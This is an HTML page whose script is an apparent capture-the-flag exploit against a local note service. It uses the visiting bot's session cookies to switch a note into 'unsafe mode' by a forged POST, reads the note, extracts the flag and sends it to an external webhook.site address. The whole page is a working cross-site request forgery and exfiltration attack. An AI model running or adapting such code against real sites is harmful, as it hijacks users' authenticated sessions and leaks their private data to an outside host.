
<html>
  <body>
    <script>
      // Step 1: Enable Unsafe Mode for the bot's note (id=1)
      fetch('http://127.0.0.1:7189/prefs/unsafe', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'id=1&enable=1',
        credentials: 'include'  // Include cookies (session)
      })
      .then(() => {
        // Step 2: Fetch the note (now in unsafe mode)
        fetch('http://127.0.0.1:7189/notes/1', {
          credentials: 'include'
        })
        .then(response => response.text())
        .then(html => {
          // Extract the flag from the note content
          const parser = new DOMParser();
          const doc = parser.parseFromString(html, 'text/html');
          const noteContent = doc.querySelector('.note-content').textContent.trim();
          
          // Step 3: Exfiltrate the flag to your webhook
          fetch('https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag=' + encodeURIComponent(noteContent));
        });
      });
    </script>
  </body>
</html>
